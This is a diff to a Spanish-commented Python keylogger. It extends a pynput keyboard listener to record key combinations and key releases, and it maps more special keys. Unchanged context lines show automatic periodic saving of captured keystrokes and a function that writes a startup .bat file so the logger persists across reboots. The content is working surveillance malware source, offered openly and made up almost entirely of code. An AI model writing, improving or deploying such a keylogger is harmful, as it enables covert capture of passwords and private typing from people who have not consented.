@@ -19,6 +19,8 @@ max_chars_per_batch = 100  # Número de caracteres antes de guardar
 max_idle_time = 600        # Tiempo máximo de inactividad para iniciar una nueva sesión
 save_interval = 300        # Intervalo de guardado automático en segundos (5 minutos)
 last_saved = time.time()   # Último tiempo de guardado
+teclas_presionadas = set()
+combinacion_actual = []
 
 # Función para categorizar las teclas presionadas
 def categorize_key(key):
@@ -27,23 +29,43 @@ def categorize_key(key):
         return {'type': 'character', 'value': key.char}
     except AttributeError:
         special_keys = {
-            keyboard.Key.space: ' ',
-            keyboard.Key.enter: '\n',
-            keyboard.Key.tab: '\t',
-            keyboard.Key.backspace: 'BACKSPACE',
+            keyboard.Key.space: 'ESPACIO',
+            keyboard.Key.enter: 'ENTER',
+            keyboard.Key.tab: 'TAB',
+            keyboard.Key.backspace: 'RETROCESO',
             keyboard.Key.shift: 'SHIFT',
             keyboard.Key.ctrl: 'CTRL',
             keyboard.Key.alt: 'ALT',
-            keyboard.Key.esc: 'ESCAPE'
+            keyboard.Key.esc: 'ESCAPE',
+            keyboard.Key.delete: 'DELETE',
+            keyboard.Key.up: 'ARRIBA',
+            keyboard.Key.down: 'ABAJO',
+            keyboard.Key.left: 'IZQUIERDA',
+            keyboard.Key.right: 'DERECHA',
+            keyboard.Key.caps_lock: 'BLOQ_MAYUS',
+            keyboard.Key.cmd: 'WINDOWS'
         }
-        return {'type': 'special', 'value': special_keys.get(key, 'UNKNOWN')}
+        return {'type': 'special', 'value': special_keys.get(key, str(key))}
 
 # Función que maneja la pulsación de teclas
 def on_press(key):
-    """Registra las teclas presionadas."""
-    global start_time
+    """Registra las teclas presionadas y sus combinaciones."""
+    global start_time, teclas_presionadas
+    
     categorized_key = categorize_key(key)
-    keystrokes.append(categorized_key)
+    teclas_presionadas.add(str(key))
+    
+    # Crear combinación de teclas si hay más de una tecla presionada
+    if len(teclas_presionadas) > 1:
+        combinacion = " + ".join(sorted(teclas_presionadas))
+        keystrokes.append({
+            'type': 'combination',
+            'value': combinacion,
+            'keys': list(teclas_presionadas)
+        })
+    else:
+        keystrokes.append(categorized_key)
+    
     start_time = time.time()
 
 # Función para guardar los datos de las teclas presionadas
@@ -107,6 +129,15 @@ def create_startup_file():
         bat_file.write(bat_content)
     print(f'Archivo de inicio creado en: {bat_file_path}')
 
+# Función para manejar la liberación de teclas
+def on_release(key):
+    """Maneja la liberación de teclas."""
+    global teclas_presionadas
+    try:
+        teclas_presionadas.remove(str(key))
+    except KeyError:
+        pass
+
 # Función principal del keylogger
 def main():
     """Configuración principal del keylogger y ejecución de los hilos."""
@@ -115,8 +146,8 @@ def main():
     save_thread.daemon = True
     save_thread.start()
 
-    # Iniciar el listener de teclado
-    with keyboard.Listener(on_press=on_press) as listener:
+    # Iniciar el listener de teclado con el manejador de liberación de teclas
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
 
 if __name__ == "__main__":
